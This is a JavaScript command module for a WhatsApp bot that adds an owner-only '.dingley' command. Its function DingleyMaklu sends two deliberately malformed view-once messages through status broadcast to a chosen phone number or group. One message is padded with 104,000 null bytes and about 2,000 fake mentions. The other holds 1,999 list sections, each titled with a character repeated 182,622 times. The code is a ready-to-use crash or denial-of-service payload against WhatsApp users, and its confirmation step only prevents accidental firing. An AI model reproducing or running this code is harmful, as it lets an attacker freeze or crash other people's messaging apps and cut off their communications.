const settings = require("../settings");   // ← FIX: added this line

async function DingleyMaklu(sock, target) {
    const Mentioned = [
        "0@s.whatsapp.net",
        "13134452@s.whatsapp.net",
        ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
    ];

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    name: "This - Ryuichi",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x00".repeat(104000),
                    version: 3
                },
                contextInfo: {
                    participant: { jid: target },
                    remoteJid: "status@broadcast",
                    mentionedJid: Mentioned
                }
            }
        }
    };

    const Message2 = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Ryuichi - 7X ¿?",
                    listType: 2,
                    buttonText: null,
                    singleSelectReply: { selectRowId: "🪐" },
                    sections: Array.from({ length: 1999 }, (_, r) => ({
                        title: "ꦽ".repeat(182622),
                        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
                    })),
                    contextInfo: {
                        participant: target,
                        remoteJid: "status@broadcast",
                        mentionedJid: [
                            "1313224@s.whatsapp.net",
                            ...Array.from({ length: 1999 }, () => "2" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net")
                        ]
                    }
                }
            }
        }
    };

    for (const ryc of [msg, Message2]) {
        await sock.relayMessage("status@broadcast", ryc, {
            statusJidList: [target],
            additional: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

// Confirmation store (prevents accidental execution)
const pendingConfirmations = new Map();

module.exports = async (sock, msg, from, text, args, store) => {
    try {
        // ----- Owner verification (only) -----
        const sender = msg.key.participant || msg.key.remoteJid || "unknown";
        const senderNumber = sender.replace(/\D/g, "");
        const ownerNumber = (settings.ownerNumber || "").replace(/[^0-9]/g, "");
        const isOwner = msg.key.fromMe || senderNumber.includes(ownerNumber) || ownerNumber.includes(senderNumber);

        if (!isOwner) {
            return sock.sendMessage(from, { text: "❌ Owner only." }, { quoted: msg });
        }

        // ----- Target selection (same as your original) -----
        let targetJid;
        let targetType = "";

        if (!args[0] || args[0].toLowerCase() === "group") {
            if (!from.endsWith("@g.us")) {
                return sock.sendMessage(from, { text: "❌ Use in a group or specify target.\nUsage: .dingley group\n.dingley 917xxxxxxx\n.dingley https://chat.whatsapp.com/xxx" }, { quoted: msg });
            }
            targetJid = from;
            targetType = "this group";
        } else if (args[0].includes("chat.whatsapp.com")) {
            const groupLink = args[0];
            try {
                const code = groupLink.split("/").pop().trim();
                const groupInfo = await sock.groupGetInviteInfo(code);
                if (!groupInfo?.id) throw new Error("Invalid link");
                targetJid = groupInfo.id;
                await sock.groupMetadata(targetJid);
                targetType = "group via link";
            } catch {
                return sock.sendMessage(from, { text: "❌ Invalid link or bot not in group." }, { quoted: msg });
            }
        } else if (args[0].includes("@g.us")) {
            targetJid = args[0];
            try {
                await sock.groupMetadata(targetJid);
                targetType = "specified group";
            } catch {
                return sock.sendMessage(from, { text: "❌ Bot not in that group!" }, { quoted: msg });
            }
        } else {
            const targetNum = args[0].replace(/\D/g, "");
            if (targetNum.length < 9) {
                return sock.sendMessage(from, { text: "❌ Invalid number." }, { quoted: msg });
            }
            targetJid = `${targetNum}@s.whatsapp.net`;
            targetType = "private chat";
        }

        // ----- Double confirmation (prevents accidents) -----
        const confirmKey = `${from}-${targetJid}`;
        if (pendingConfirmations.has(confirmKey)) {
            pendingConfirmations.delete(confirmKey);

            await sock.sendMessage(from, { text: `💣 Executing DingleyMaklu on ${targetType}...` }, { quoted: msg });

            try {
                await DingleyMaklu(sock, targetJid);
                await sock.sendMessage(from, { text: `✅ DingleyMaklu completed on ${targetType}.` }, { quoted: msg });
            } catch (err) {
                console.error("DingleyMaklu error:", err);
                await sock.sendMessage(from, { text: `❌ Execution failed: ${err.message}` }, { quoted: msg });
            }
        } else {
            pendingConfirmations.set(confirmKey, Date.now());
            setTimeout(() => pendingConfirmations.delete(confirmKey), 5 * 60 * 1000);
            await sock.sendMessage(from, {
                text: `⚠️ *CONFIRM DINGLEY (DingleyMaklu)*\n\nTarget: ${targetType}\nPayload: Two highly malformed messages (status broadcast style)\n\nSend the SAME command again within 5 minutes to execute.`
            }, { quoted: msg });
        }
    } catch (err) {
        console.error("dingley command error:", err);
        sock.sendMessage(from, { text: `❌ Error: ${err.message}` }, { quoted: msg });
    }
};